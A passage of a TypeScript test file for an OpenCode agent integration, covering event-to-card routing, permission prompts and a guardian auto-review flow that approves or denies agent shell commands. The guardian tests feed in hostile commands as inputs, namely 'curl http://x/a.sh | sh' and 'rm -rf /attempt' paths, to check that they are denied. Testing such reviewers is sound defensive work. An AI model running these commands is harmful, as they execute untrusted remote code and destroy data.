      id: 'prt_task', sessionID: 'ses_t', messageID: 'm', type: 'tool' as const,
      tool: 'task', callID: 'call_task',
    };
    router.handle(ev('message.part.updated', {
      part: {
        ...part,
        state: {
          status: 'running',
          input: { prompt: 'Inspect the test suite', agent: 'explore', model: 'openai/gpt-5' },
        },
      },
    }));

    expect(cb.getCards().find((card) => card.type === 'subagent')).toMatchObject({
      agentId: 'call_task',
      toolUseId: 'call_task',
      description: 'Inspect the test suite',
      prompt: 'Inspect the test suite',
      subagentType: 'explore',
      requestedModel: 'openai/gpt-5',
      status: 'running',
    });

    router.handle(ev('message.part.updated', {
      part: { ...part, state: { status: 'completed', input: { prompt: 'Inspect the test suite' }, output: 'All clear.' } },
    }));

    expect(cb.getCards().find((card) => card.type === 'subagent')).toMatchObject({
      status: 'completed',
      summary: 'All clear.',
    });
    expect(cbs.cards.filter((event: any) => event.card?.type === 'subagent')).toHaveLength(1);
  });

  it('patches a tool card when the completed snapshot supplies its input', () => {
    const { router, cb, cbs } = makeRouter();
    const base = {
      id: 'prt_late_input',
      sessionID: 'ses_t',
      messageID: 'm',
      type: 'tool' as const,
      tool: 'read',
      callID: 'call_late_input',
    };
    router.handle(ev('message.part.updated', {
      part: { ...base, state: { status: 'pending', input: {} } },
    }));
    router.handle(ev('message.part.updated', {
      part: {
        ...base,
        state: {
          status: 'completed',
          input: { filePath: '/tmp/final.txt' },
          output: 'content',
        },
      },
    }));
    const toolCard = cb.getCards().find((card) => card.type === 'tool_call');
    expect(toolCard).toMatchObject({
      toolName: 'Read',
      toolInput: { filePath: '/tmp/final.txt', file_path: '/tmp/final.txt' },
    });
    expect(cbs.cards.some((event: any) =>
      event.type === 'update' && event.patch?.toolInput?.file_path === '/tmp/final.txt',
    )).toBe(true);
  });

  it('normalizes and patches a late Glob pattern', () => {
    const { router, cb } = makeRouter();
    const base = {
      id: 'prt_glob',
      sessionID: 'ses_t',
      messageID: 'm',
      type: 'tool' as const,
      tool: 'glob',
      callID: 'call_glob',
    };
    router.handle(ev('message.part.updated', {
      part: { ...base, state: { status: 'pending', input: {} } },
    }));
    router.handle(ev('message.part.updated', {
      part: {
        ...base,
        state: {
          status: 'completed',
          input: { pattern: '**/*.tsx', path: 'apps/pwa' },
          output: 'apps/pwa/src/App.tsx',
        },
      },
    }));
    expect(cb.getCards().find((card) => card.type === 'tool_call')).toMatchObject({
      toolName: 'Glob',
      toolInput: { pattern: '**/*.tsx', path: 'apps/pwa' },
    });
  });

  it('session.idle finalizes with success=true', async () => {
    const { router, cbs } = makeRouter();
    router.handle(ev('session.idle', { sessionID: 'ses_t' }));
    await flushAsync();
    expect(cbs.ends).toHaveLength(1);
    expect(cbs.ends[0]).toMatchObject({ sessionId: 'ses_t', success: true });
  });

  it('session.status idle also finalizes with success=true', async () => {
    const { router, cbs } = makeRouter();
    router.handle(ev('session.status', { sessionID: 'ses_t', status: { type: 'idle' } }));
    await flushAsync();
    expect(cbs.ends).toHaveLength(1);
    expect(cbs.ends[0]).toMatchObject({ sessionId: 'ses_t', success: true });
  });

  it('session.error surfaces the message and finalizes with success=false', async () => {
    const { router, cbs } = makeRouter();
    router.handle(ev('session.error', {
      sessionID: 'ses_t',
      error: { name: 'UnknownError', data: { message: 'Model not found: foo/bar.' } },
    }));
    await flushAsync();
    const errCard = cbs.cards.find((c: any) => c.card?.type === 'assistant_text' && c.card.text?.startsWith('[opencode error]'));
    expect(errCard?.card?.text).toContain('Model not found');
    expect(cbs.ends).toHaveLength(1);
    expect(cbs.ends[0]).toMatchObject({ success: false, error: 'Model not found: foo/bar.' });
  });

  it('recognizes only the provider context-overflow error shape', () => {
    expect(isOpenCodeContextOverflowError(
      "This model's maximum context length is 262144 tokens. However, you requested 32000 output tokens and your prompt contains at least 230145 input tokens.",
    )).toBe(true);
    expect(isOpenCodeContextOverflowError('Model not found: foo/bar.')).toBe(false);
  });

  it('server.disposed finalizes with success=false', async () => {
    const { router, cbs } = makeRouter();
    router.handle(ev('server.disposed', {}));
    await flushAsync();
    expect(cbs.ends[0]).toMatchObject({ success: false, error: expect.stringContaining('server') });
  });

  it('ignores subsequent events once finalized', async () => {
    const { router, cbs } = makeRouter();
    router.handle(ev('session.idle', { sessionID: 'ses_t' }));
    await flushAsync();
    router.handle(ev('message.part.updated', {
      sessionID: 'ses_t', time: 99,
      part: { id: 'prt_late', sessionID: 'ses_t', messageID: 'm', type: 'text', text: 'late' },
    }));
    expect(cbs.cards.filter((c: any) => c.card?.type === 'assistant_text')).toHaveLength(0);
    expect(cbs.ends).toHaveLength(1);
  });

  it('session.diff triggers REST tool-part sync that emits tool cards', async () => {
    const { router, cbs, server } = makeRouter();
    // Simulate the REST snapshot opencode would return after a bash call.
    server.messages.push({
      info: { id: 'msg_a', role: 'assistant' },
      parts: [{
        id: 'prt_t', sessionID: 'ses_t', messageID: 'msg_a', type: 'tool',
        tool: 'bash', callID: 'call_d',
        state: { status: 'completed', input: { command: 'pwd' }, output: '/home\n' },
      }],
    });
    router.handle(ev('session.diff', { sessionID: 'ses_t', diff: [] }));
    await flushAsync();
    expect(cbs.tools).toEqual([{ sessionId: 'ses_t', toolName: 'Bash', input: { command: 'pwd' } }]);
    const result = cbs.cards.find((c: any) => c.type === 'update' && c.patch?.result);
    expect(result?.patch?.result?.content).toBe('/home\n');
  });

  it('session.idle does a final REST sync so tool cards land before stream-end', async () => {
    const { router, cbs, server } = makeRouter();
    server.messages.push({
      info: { id: 'msg_a', role: 'assistant' },
      parts: [{
        id: 'prt_t', sessionID: 'ses_t', messageID: 'msg_a', type: 'tool',
        tool: 'read', callID: 'call_i',
        state: { status: 'completed', input: { filePath: '/etc/hosts' }, output: '127.0.0.1' },
      }],
    });
    router.handle(ev('session.idle', { sessionID: 'ses_t' }));
    await flushAsync();
    const toolCard = cbs.cards.find((c: any) => c.card?.type === 'tool_call');
    expect(toolCard).toBeTruthy();
    expect(cbs.ends).toHaveLength(1);
    // Stream-end must come AFTER the tool card.
    const toolIdx = cbs.cards.indexOf(toolCard);
    const endIdx = cbs.cards.length; // ends array is separate
    expect(toolIdx).toBeGreaterThanOrEqual(0);
    expect(endIdx).toBeGreaterThan(toolIdx);
  });

  it('REST sync is idempotent: repeated syncs for the same tool emit one card', async () => {
    const { router, cbs, server } = makeRouter();
    server.messages.push({
      info: { id: 'msg_a', role: 'assistant' },
      parts: [{
        id: 'prt_t', sessionID: 'ses_t', messageID: 'msg_a', type: 'tool',
        tool: 'bash', callID: 'call_x',
        state: { status: 'completed', input: { command: 'pwd' }, output: 'x' },
      }],
    });
    router.handle(ev('session.diff', { sessionID: 'ses_t', diff: [] }));
    await flushAsync();
    router.handle(ev('session.diff', { sessionID: 'ses_t', diff: [] }));
    await flushAsync();
    router.handle(ev('session.idle', { sessionID: 'ses_t' }));
    await flushAsync();
    expect(cbs.cards.filter((c: any) => c.card?.type === 'tool_call')).toHaveLength(1);
  });

  it('does not replay prior-turn REST tool parts after resetForNewTurn', async () => {
    const { router, cbs, server } = makeRouter();
    server.messages.push({
      info: { id: 'msg_old', role: 'assistant' },
      parts: [{
        id: 'prt_old',
        sessionID: 'ses_t',
        messageID: 'msg_old',
        type: 'tool',
        tool: 'bash',
        callID: 'call_old',
        state: { status: 'completed', input: { command: 'pwd' }, output: '/p' },
      }],
    });
    router.handle(ev('session.diff', { sessionID: 'ses_t', diff: [] }));
    await flushAsync();
    router.resetForNewTurn();
    server.messages.push({
      info: { id: 'msg_new', role: 'assistant' },
      parts: [{
        id: 'prt_new',
        sessionID: 'ses_t',
        messageID: 'msg_new',
        type: 'tool',
        tool: 'glob',
        callID: 'call_new',
        state: { status: 'completed', input: { pattern: '**/*.ts' }, output: 'a.ts' },
      }],
    });
    router.handle(ev('session.diff', { sessionID: 'ses_t', diff: [] }));
    await flushAsync();
    expect(cbs.cards.filter((event: any) => event.card?.type === 'tool_call')).toHaveLength(2);
    expect(cbs.tools.map((tool) => tool.toolName)).toEqual(['Bash', 'Glob']);
  });

  it('does not replay historical REST tool parts after cold-resume priming', async () => {
    const { router, cbs, server } = makeRouter();
    server.messages.push({
      info: { id: 'msg_old', role: 'assistant' },
      parts: [{
        id: 'prt_old',
        sessionID: 'ses_t',
        messageID: 'msg_old',
        type: 'tool',
        tool: 'bash',
        callID: 'call_old',
        state: { status: 'completed', input: { command: 'pwd' }, output: '/p' },
      }],
    });

    await router.primeHistoricalState();
    server.messages.push({
      info: { id: 'msg_new', role: 'assistant' },
      parts: [{
        id: 'prt_new',
        sessionID: 'ses_t',
        messageID: 'msg_new',
        type: 'tool',
        tool: 'glob',
        callID: 'call_new',
        state: { status: 'completed', input: { pattern: '**/*.ts' }, output: 'a.ts' },
      }],
    });
    router.handle(ev('session.diff', { sessionID: 'ses_t', diff: [] }));
    await flushAsync();

    const toolCards = cbs.cards.filter((event: any) => event.card?.type === 'tool_call');
    expect(toolCards).toHaveLength(1);
    expect(toolCards[0]?.card).toMatchObject({ toolName: 'Glob', toolUseId: 'call_new' });
    expect(cbs.tools.map((tool) => tool.toolName)).toEqual(['Glob']);
  });

  it('resetForNewTurn allows a fresh turn to flow', async () => {
    const { router, cbs } = makeRouter();
    router.handle(ev('session.idle', { sessionID: 'ses_t' }));
    await flushAsync();
    router.resetForNewTurn();
    router.handle(ev('message.part.updated', {
      sessionID: 'ses_t', time: 2,
      part: { id: 'prt_2', sessionID: 'ses_t', messageID: 'm2', type: 'text', text: 'turn 2' },
    }));
    const texts = cbs.cards.filter((c: any) => c.card?.type === 'assistant_text');
    expect(texts.find((t: any) => t.card.text === 'turn 2')).toBeTruthy();
  });

  it('forwards permission.asked → handlePermissionRequest → POSTs reply', async () => {
    const server = makeMockServer();
    const cb = new StreamCardBuilder('ses_t', '/p');
    const calls: any[] = [];
    const cbs: ProviderCallbacks = {
      ...makeCallbacks(),
      handlePermissionRequest: async (sessionId, req) => {
        calls.push({ sessionId, ...req });
        return { action: 'allow' };
      },
    };
    const router = new SessionEventRouter('ses_t', cb, cbs, server, { directory: '/p' });
    router.handle({
      id: 'evt', type: 'permission.asked',
      properties: {
        id: 'per_abc', sessionID: 'ses_t',
        permission: 'bash',
        metadata: { command: 'ls' },
        tool: { messageID: 'msg_x', callID: 'call_x' },
      },
    });
    await new Promise((r) => setImmediate(r));
    expect(calls).toHaveLength(1);
    expect(calls[0].toolName).toBe('Bash');
    expect(calls[0].toolInput).toEqual({ command: 'ls' });
    expect(server.replies).toEqual([{ requestID: 'per_abc', directory: '/p', reply: 'once' }]);
  });

  describe('auto-review (guardian) permission flow', () => {
    afterEach(() => {
      delete process.env.QUICKSAVE_GUARDIAN_MAX_CONSECUTIVE;
      delete process.env.QUICKSAVE_GUARDIAN_MODEL_SERVER_URL;
      delete process.env.QUICKSAVE_GUARDIAN_MODEL;
      vi.unstubAllGlobals();
    });

    /** makeMockServer + guardian session support with an injectable SSE tap. */
    function makeGuardianServer(
      verdict: Record<string, unknown> = {
        risk_level: 'low', user_authorization: 'high', outcome: 'allow', rationale: 'routine',
      },
    ): OpenCodeServer & {
      guardianEvents: Array<{ sessionID: string; ev: OpenCodeEvent }>;
      emitGuardian: (sessionID: string, ev: OpenCodeEvent) => void;
      guardianPrompts: Array<Record<string, unknown>>;
    } {
      const base = makeMockServer();
      let tap: ((ev: OpenCodeEvent) => void) | null = null;
      const guardianPrompts: Array<Record<string, unknown>> = [];
      process.env.QUICKSAVE_GUARDIAN_MODEL_SERVER_URL = 'http://localhost:8000/v1';
      process.env.QUICKSAVE_GUARDIAN_MODEL = 'reviewer-model';
      vi.stubGlobal('fetch', vi.fn(async (_url: string, init: RequestInit) => {
        guardianPrompts.push(JSON.parse(init.body as string) as Record<string, unknown>);
        return new Response(JSON.stringify({
          choices: [{ message: { content: JSON.stringify(verdict) } }],
        }), { status: 200 });
      }));
      const mock = {
        ...base,
        createSession: async (opts: Record<string, unknown>) => {
          base.creates.push(opts);
          return { id: 'ses_guardian' };
        },
        getSession: async (id: string) => {
          if (id !== 'ses_guardian') throw new Error('404');
          return { id, directory: '/p' };
        },
        listSessions: async () => [{ id: 'ses_guardian', directory: '/p' }],
        sendPromptAsync: async (sessionID: string, directory: string, body: unknown) => {
          if (sessionID === 'ses_guardian') {
            guardianPrompts.push(body as Record<string, unknown>);
            setImmediate(() => {
              const ev: OpenCodeEvent = {
                type: 'message.part.updated',
                properties: {
                  part: {
                    sessionID,
                    type: 'tool',
                    tool: 'StructuredOutput',
                    state: { status: 'completed', input: verdict },
                  },
                },
              };
              tap?.(ev);
            });
          }
        },
        subscribe: (sessionID: string, listener: (ev: OpenCodeEvent) => void) => {
          if (sessionID === 'ses_guardian') {
            tap = listener;
            return () => { if (tap === listener) tap = null; };
          }
          return base.subscribe(sessionID, listener);
        },
      } as never as OpenCodeServer & {
        guardianEvents: Array<{ sessionID: string; ev: OpenCodeEvent }>;
        emitGuardian: (sessionID: string, ev: OpenCodeEvent) => void;
        guardianPrompts: Array<Record<string, unknown>>;
      };
      mock.guardianEvents = [];
      mock.guardianPrompts = guardianPrompts;
      mock.emitGuardian = (sessionID, ev) => {
        mock.guardianEvents.push({ sessionID, ev });
        tap?.(ev);
      };
      return mock;
    }

    function makeAutoReviewRouter(server: OpenCodeServer, cbs: ProviderCallbacks): SessionEventRouter {
      return new SessionEventRouter('ses_t', new StreamCardBuilder('ses_t', '/p'), cbs, server, {
        directory: '/p',
        permissionLevel: 'auto-review',
      });
    }

    /** CardEvents carry the guardian text either on `card` (add) or
     *  `patch.guardianMessage` (update) — collect both. */
    function collectGuardianNotes(cards: unknown[]): string[] {
      return cards
        .map((event) => {
          const e = event as { type?: string; card?: any; patch?: any };
          if (e.type === 'update') {
            return e.patch?.guardianMessage ?? e.patch?.pendingInput?.guardianMessage;
          }
          return e.card?.guardianMessage ?? e.card?.pendingInput?.guardianMessage;
        })
        .filter((note): note is string => typeof note === 'string');
    }

    function primeToolCard(server: OpenCodeServer, router: SessionEventRouter): void {
      // Mutate the captured array (getMessages closes over it).
      const messages = (server as unknown as { messages: Array<Record<string, unknown>> }).messages;
      messages.length = 0;
      messages.push({
        info: { id: 'msg1', role: 'assistant' },
        parts: [{
          type: 'tool',
          tool: 'bash',
          callID: 'call_x',
          state: { status: 'pending', input: { command: 'ls' } },
        }],
      });
      router.handle({ id: 'diff', type: 'session.diff', properties: { sessionID: 'ses_t' } });
    }

    it('bypasses the guardian for trusted Quicksave control tools', async () => {
      const server = makeGuardianServer();
      const cbs = makeCallbacks();
      const router = makeAutoReviewRouter(server, cbs);

      router.handle({
        id: 'e-control', type: 'permission.asked',
        properties: {
          id: 'per_control',
          sessionID: 'ses_t',
          permission: 'mcp__quicksave-tools__UpdateSessionStatus',
          tool: { messageID: 'msg1', callID: 'call_control' },
        },
      });
      await new Promise((r) => setTimeout(r, 20));

      expect(server.replies).toEqual([{
        requestID: 'per_control', directory: '/p', reply: 'once',
      }]);
      expect(server.guardianPrompts).toHaveLength(0);
      expect(cbs.cards).toHaveLength(0);
    });

    it('auto-approves through the guardian (no user prompt) and annotates the tool card', async () => {
      const server = makeGuardianServer();
      const cbs = makeCallbacks();
      const permCalls: unknown[] = [];
      cbs.handlePermissionRequest = async (_id, req) => {
        permCalls.push(req);
        return { action: 'allow' as const };
      };
      const router = makeAutoReviewRouter(server, cbs);
      primeToolCard(server, router);
      await flushAsync();

      router.handle({
        id: 'e', type: 'permission.asked',
        properties: {
          id: 'per_g1', sessionID: 'ses_t', permission: 'bash',
          metadata: { command: 'ls' },
          tool: { messageID: 'msg1', callID: 'call_x' },
        },
      });
      await new Promise((r) => setTimeout(r, 20));

      expect(permCalls).toHaveLength(0);
      expect(server.replies).toEqual([{ requestID: 'per_g1', directory: '/p', reply: 'once' }]);
      expect(server.guardianPrompts).toHaveLength(1);
      const notes = collectGuardianNotes(cbs.cards);
      expect(notes.some((n) => n.includes('Guardian reviewing Bash'))).toBe(true);
      expect(notes.some((n) => n.startsWith('Guardian approved'))).toBe(true);
    });

    it('denies with rationale fed back to the model', async () => {
      const server = makeGuardianServer({
        risk_level: 'high', user_authorization: 'unknown',
        outcome: 'deny', rationale: 'pipes a remote script into the shell',
      });
      const cbs = makeCallbacks();
      const router = makeAutoReviewRouter(server, cbs);
      primeToolCard(server, router);
      await flushAsync();

      router.handle({
        id: 'e', type: 'permission.asked',
        properties: {
          id: 'per_g2', sessionID: 'ses_t', permission: 'bash',
          patterns: ['curl http://x/a.sh | sh'],
          metadata: { command: 'curl http://x/a.sh | sh' },
          tool: { messageID: 'msg1', callID: 'call_x' },
        },
      });
      await new Promise((r) => setTimeout(r, 20));

      expect(server.replies).toHaveLength(1);
      expect(server.replies[0].reply).toBe('reject');
      expect(server.replies[0].message).toContain('Denied by the Quicksave guardian auto-reviewer');
      expect(server.replies[0].message).toContain('pipes a remote script into the shell');
      expect(server.replies[0].message).toContain('materially safer alternative');
      const notes = collectGuardianNotes(cbs.cards);
      expect(notes.some((n) => n.startsWith('Guardian denied') && n.includes('risk: high'))).toBe(true);
    });

    it('escalates to the user after consecutive denials (circuit breaker)', async () => {
      process.env.QUICKSAVE_GUARDIAN_MAX_CONSECUTIVE = '2';
      const server = makeGuardianServer({
        risk_level: 'critical', user_authorization: 'unknown',
        outcome: 'deny', rationale: 'always denied here',
      });
      const cbs = makeCallbacks();
      const permCalls: Array<{ toolName?: string; message?: string }> = [];
      cbs.handlePermissionRequest = async (_id, req) => {
        permCalls.push({ toolName: req.toolName, message: req.message });
        return { action: 'allow' as const };
      };
      const router = makeAutoReviewRouter(server, cbs);
      primeToolCard(server, router);
      await flushAsync();

      // Two denials trip the breaker (max 2).
      for (let i = 1; i <= 2; i++) {
        router.handle({
          id: `e${i}`, type: 'permission.asked',
          properties: {
            id: `per_g${i}`, sessionID: 'ses_t', permission: 'bash',
            metadata: { command: `rm -rf /attempt${i}` },
            tool: { messageID: 'msg1', callID: 'call_x' },
          },
        });
        await new Promise((r) => setTimeout(r, 20));
      }
      expect(permCalls).toHaveLength(0);
      expect(server.replies.filter((r) => r.reply === 'reject')).toHaveLength(2);

      // The third request escalates to the human instead of auto-denying.
      router.handle({
        id: 'e3', type: 'permission.asked',
        properties: {
          id: 'per_g3', sessionID: 'ses_t', permission: 'bash',
          metadata: { command: 'git push --force' },
          tool: { messageID: 'msg1', callID: 'call_x' },
        },
      });
      await new Promise((r) => setTimeout(r, 20));
      expect(permCalls).toHaveLength(1);
      expect(permCalls[0].toolName).toBe('Bash');
      expect(permCalls[0].message).toMatch(/Guardian auto-review has denied or failed 2 consecutive/);
      expect(server.replies.at(-1)).toEqual({ requestID: 'per_g3', directory: '/p', reply: 'once' });
      // The breaker reset — the next request is reviewed again, not escalated.
      router.handle({
        id: 'e4', type: 'permission.asked',
        properties: {
          id: 'per_g4', sessionID: 'ses_t', permission: 'bash',
          metadata: { command: 'ls' },
          tool: { messageID: 'msg1', callID: 'call_x' },
        },
      });
      await new Promise((r) => setTimeout(r, 20));
      expect(permCalls).toHaveLength(1);
      expect(server.replies).toHaveLength(4);
    });
  });

  it('maps question.asked to one blocking question card flow and replies with structured answers', async () => {
    const server = makeMockServer();
    const cb = new StreamCardBuilder('ses_t', '/p');
    const calls: any[] = [];
    const cbs: ProviderCallbacks = {
      ...makeCallbacks(),
      handlePermissionRequest: async (sessionId, req) => {
        calls.push({ sessionId, ...req });
        return { action: 'allow', response: 'TypeScript\nFast, Safe' };
      },
    };
    const router = new SessionEventRouter('ses_t', cb, cbs, server, { directory: '/p' });

    router.handle(ev('question.asked', {
      id: 'question_abc',
      sessionID: 'ses_t',
      tool: { messageID: 'msg_x', callID: 'call_question' },
      questions: [
        {
          header: 'Language',
          question: 'Which language?',
          options: [{ label: 'TypeScript', description: 'Typed JavaScript' }],
          custom: false,
        },
        {
          header: 'Goals',
          question: 'Which qualities matter?',
          options: [{ label: 'Fast', description: 'Low latency' }, { label: 'Safe', description: 'Few regressions' }],
          multiple: true,
        },
      ],
    }));
    await new Promise((resolve) => setImmediate(resolve));

    expect(calls).toEqual([expect.objectContaining({
      sessionId: 'ses_t',
      requestId: 'question_abc',
      inputType: 'question',
      toolName: 'AskUserQuestion',
      toolUseId: 'call_question',
      skipAutoApprove: true,
      toolInput: {
        questions: [
          expect.objectContaining({ question: 'Which language?', header: 'Language', allowFreeText: false }),
          expect.objectContaining({ question: 'Which qualities matter?', header: 'Goals', multiSelect: true }),
        ],
      },
    })]);
    expect(server.questionReplies).toEqual([{
      requestID: 'question_abc',
      directory: '/p',
      answers: [['TypeScript'], ['Fast', 'Safe']],
    }]);
    expect(server.replies).toEqual([]);
  });

  it('rejects question.asked when the user declines or supplies no answer', async () => {
    const server = makeMockServer();
    const cbs: ProviderCallbacks = {
      ...makeCallbacks(),
      handlePermissionRequest: async () => ({ action: 'deny', response: 'Not now' }),
    };
    const router = new SessionEventRouter('ses_t', new StreamCardBuilder('ses_t', '/p'), cbs, server, { directory: '/p' });
    router.handle(ev('question.asked', {
      id: 'question_declined',
      sessionID: 'ses_t',
      questions: [{ header: 'Choice', question: 'Continue?', options: [{ label: 'Yes', description: 'Continue' }] }],
    }));
    await new Promise((resolve) => setImmediate(resolve));

    expect(server.questionRejections).toEqual([{ requestID: 'question_declined', directory: '/p' }]);
    expect(server.questionReplies).toEqual([]);
  });

  it('normalizes external_directory into its dedicated permission card shape', async () => {
    const server = makeMockServer();
    const cb = new StreamCardBuilder('ses_t', '/p');
    const calls: any[] = [];
    const cbs: ProviderCallbacks = {
      ...makeCallbacks(),
      handlePermissionRequest: async (_sessionId, req) => {
        calls.push(req);
        return { action: 'allow' };
      },
    };
    const router = new SessionEventRouter('ses_t', cb, cbs, server, { directory: '/p' });
    router.handle(ev('permission.asked', {
      id: 'per_external',
      sessionID: 'ses_t',
      permission: 'external_directory',
      patterns: ['/home/jimmy/.config/opencode/*'],
      metadata: {
        filepath: '/home/jimmy/.config/opencode/opencode.json',
        parentDir: '/home/jimmy/.config/opencode',
      },
    }));
    await new Promise((resolve) => setImmediate(resolve));
    expect(calls).toEqual([{
      toolName: 'ExternalDirectory',
      toolInput: {
        filepath: '/home/jimmy/.config/opencode/opencode.json',
        parentDir: '/home/jimmy/.config/opencode',
        patterns: ['/home/jimmy/.config/opencode/*'],
      },
      toolUseId: 'per_external',
    }]);
  });

  it('sends the user-provided reason when rejecting permission', async () => {
    const server = makeMockServer();
    const cb = new StreamCardBuilder('ses_t', '/p');
    const cbs: ProviderCallbacks = {
      ...makeCallbacks(),
      handlePermissionRequest: async () => ({
        action: 'deny',
        response: 'Use the read-only API instead',
      }),
    };
    const router = new SessionEventRouter('ses_t', cb, cbs, server, { directory: '/p' });
    router.handle({
      id: 'evt', type: 'permission.asked',
      properties: {
        id: 'per_xyz', sessionID: 'ses_t',
        permission: 'bash',
        metadata: {},
        tool: { messageID: 'msg_x', callID: 'call_x' },
      },
    });
    await new Promise((r) => setImmediate(r));
    expect(server.replies).toEqual([{
      requestID: 'per_xyz',
      directory: '/p',
      reply: 'reject',
      message: 'Use the read-only API instead',
    }]);
  });

  it('auto mode replies once without prompting Quicksave', async () => {
    const server = makeMockServer();
    const cb = new StreamCardBuilder('ses_t', '/p');
    const cbs = makeCallbacks();
    const permissionSpy = vi.fn(async () => ({ action: 'allow' as const }));
    cbs.handlePermissionRequest = permissionSpy;
    const router = new SessionEventRouter('ses_t', cb, cbs, server, {
      directory: '/p',
      permissionLevel: 'auto',
    });
    router.handle(ev('permission.asked', {
      id: 'per_auto',
      sessionID: 'ses_t',
      permission: 'bash',
      patterns: ['git status *'],
      metadata: { command: 'git status' },
    }));
    await new Promise((r) => setImmediate(r));
    expect(permissionSpy).not.toHaveBeenCalled();
    expect(server.replies).toEqual([{ requestID: 'per_auto', directory: '/p', reply: 'once' }]);
  });

  it('can switch auto mode on for an existing session', async () => {
    const server = makeMockServer();
    const cb = new StreamCardBuilder('ses_t', '/p');
    const cbs = makeCallbacks();
    const router = new SessionEventRouter('ses_t', cb, cbs, server, {
      directory: '/p',
      permissionLevel: 'default',
    });
    router.setPermissionLevel('auto');
    router.handle(ev('permission.asked', { id: 'per_switched', sessionID: 'ses_t', permission: 'edit' }));
    await new Promise((r) => setImmediate(r));
    expect(server.replies).toEqual([{ requestID: 'per_switched', directory: '/p', reply: 'once' }]);
  });
});

describe('OpenCode tool normalization', () => {
  it('maps every built-in with a dedicated Quicksave card', () => {
    expect([
      'bash', 'shell', 'read', 'edit', 'write', 'grep', 'glob', 'webfetch',
      'websearch', 'skill', 'task', 'todowrite', 'question', 'lsp',
      'apply_patch', 'plan', 'external_directory',
    ].map(normalizeOpenCodeToolName)).toEqual([
      'Bash', 'Bash', 'Read', 'Edit', 'Write', 'Grep', 'Glob', 'WebFetch',
      'WebSearch', 'Skill', 'Agent', 'TodoWrite', 'AskUserQuestion', 'LSP',
      'ApplyPatch', 'ExitPlanMode', 'ExternalDirectory',
    ]);
  });

  it('adapts OpenCode camelCase arguments to existing card schemas', () => {
    expect(normalizeOpenCodeToolInput('edit', {
      filePath: '/tmp/a',
      oldString: 'a',
      newString: 'b',
      replaceAll: true,
    })).toMatchObject({
      file_path: '/tmp/a',
      old_string: 'a',
      new_string: 'b',
      replace_all: true,
    });
    expect(normalizeOpenCodeToolInput('skill', { name: 'demo' })).toMatchObject({ skill: 'demo' });
    expect(normalizeOpenCodeToolInput('apply_patch', { patchText: '*** Begin Patch' }))
      .toMatchObject({ patch_text: '*** Begin Patch' });
  });

  it('hides the host-injected MCP session id from tool cards', () => {
    expect(normalizeOpenCodeToolInput(
      'mcp__quicksave-tools__UpdateSessionStatus',
      { stage: 'working', _quicksaveSessionId: 'ses_123' },
    )).toEqual({ stage: 'working' });
  });
});

// ── Provider top-level ───────────────────────────────────────────────────────

describe('OpenCodeProvider', () => {
  it('has correct id, label, historyMode, and reports resume support', async () => {
    mockExecSync.mockImplementation(() => '1.0.0');
    const provider = new OpenCodeProvider(makeMockServer());
    expect(provider.id).toBe('opencode');
    expect(provider.label).toBe('OpenCode');
    expect(provider.historyMode).toBe('opencode-thread');
    const probe = await provider.probeProvider();
    expect(probe.capabilities.supportsResume).toBe(true);
    expect(probe.capabilities.supportsStreaming).toBe(true);
    expect(probe.capabilities.supportsAttachments).toBe(true);
    expect(probe.capabilities.supportedAttachmentKinds).toEqual(['image', 'pdf', 'text']);
    expect(probe.version).toBe('1.18.4');
  });

  it('reads models from the running server provider API', async () => {
    mockExecSync.mockImplementation(() => '1.18.4');
    const r = await new OpenCodeProvider(makeMockServer()).probeProvider();
    const ids = r.models?.map((m) => m.id).sort();
    expect(ids).toEqual(['opencode/big-pickle', 'vllm/foo/bar']);
    expect(r.models?.find((m) => m.id === 'vllm/foo/bar')?.name).toBe('Foo Bar');
  });

  it('lists only root sessions in the requested project directory', async () => {
    const server = makeMockServer();
    const listSessions = vi.fn().mockResolvedValue([
      { id: 'ses_root', directory: '/workspace/app', title: 'Root', time: { created: 10, updated: 20 } },
      { id: 'ses_child', directory: '/workspace/app', parentID: 'ses_root', title: 'Subagent', time: { created: 11, updated: 21 } },
      { id: 'ses_other-project', directory: '/workspace/other', title: 'Elsewhere', time: { created: 12, updated: 22 } },
    ]);
    (server as any).listSessions = listSessions;

    await expect(new OpenCodeProvider(server).listNativeSessions({ cwd: '/workspace/app' })).resolves.toEqual([
      expect.objectContaining({ sessionId: 'ses_root', cwd: '/workspace/app' }),
    ]);
    expect(listSessions).toHaveBeenCalledWith('/workspace/app');
  });

  it('looks up one root session by id without listing every session', async () => {
    const server = makeMockServer();
    const getSession = vi.fn().mockResolvedValue({
      id: 'ses_root', directory: '/workspace/app', title: 'Root', time: { created: 10, updated: 20 },
    });
    const listSessions = vi.fn();
    (server as any).getSession = getSession;
    (server as any).listSessions = listSessions;

    await expect(new OpenCodeProvider(server).getNativeSession('ses_root')).resolves.toEqual(
      expect.objectContaining({ sessionId: 'ses_root', cwd: '/workspace/app', agent: 'opencode' }),
    );
    expect(getSession).toHaveBeenCalledWith('ses_root', undefined);
    expect(listSessions).not.toHaveBeenCalled();
  });

  it('compacts via the native summarize API and emits the compacted card', async () => {
    const server = makeMockServer();
    const compactSession = vi.fn().mockResolvedValue(undefined);
    (server as any).compactSession = compactSession;
    const emits: Array<[string, 'compacted']> = [];

    await new OpenCodeProvider(server).compact(
      'ses_x',
      { cwd: '/workspace/app', model: 'vllm/foo/bar' },
      (text, subtype) => emits.push([text, subtype]),
    );

    expect(compactSession).toHaveBeenCalledWith(
      'ses_x',
      '/workspace/app',
      { providerID: 'vllm', modelID: 'foo/bar' },
    );
    expect(emits).toEqual([['Context compacted', 'compacted']]);
  });

  it('falls back to the model stored on the opencode session when Quicksave has none', async () => {
    const server = makeMockServer();
    const compactSession = vi.fn().mockResolvedValue(undefined);
    (server as any).compactSession = compactSession;
    (server as any).getSession = vi.fn().mockResolvedValue({
      id: 'ses_x',
      model: { providerID: 'vllm', id: 'foo/bar' },
    });

    await new OpenCodeProvider(server).compact('ses_x', { cwd: '/workspace/app' });

    expect(compactSession).toHaveBeenCalledWith(
      'ses_x',
      '/workspace/app',
      { providerID: 'vllm', modelID: 'foo/bar' },
    );
  });

  it('rejects when the session model cannot be resolved', async () => {
    const server = makeMockServer();
    (server as any).compactSession = vi.fn();
    (server as any).getSession = vi.fn().mockResolvedValue({ id: 'ses_x' });

    await expect(new OpenCodeProvider(server).compact('ses_x', { cwd: '/workspace/app' }))
      .rejects.toThrow(/requires the session model/);
  });

  it('projects v2 persisted messages into final-state cards', () => {
    const cards = projectOpenCodeMessages('ses_history', '/workspace/a', [
      { id: 'msg_user', type: 'user', text: 'inspect this' },
      {
        id: 'msg_assistant', type: 'assistant', content: [
          { type: 'reasoning', id: 'reason_1', text: 'I will inspect it.' },
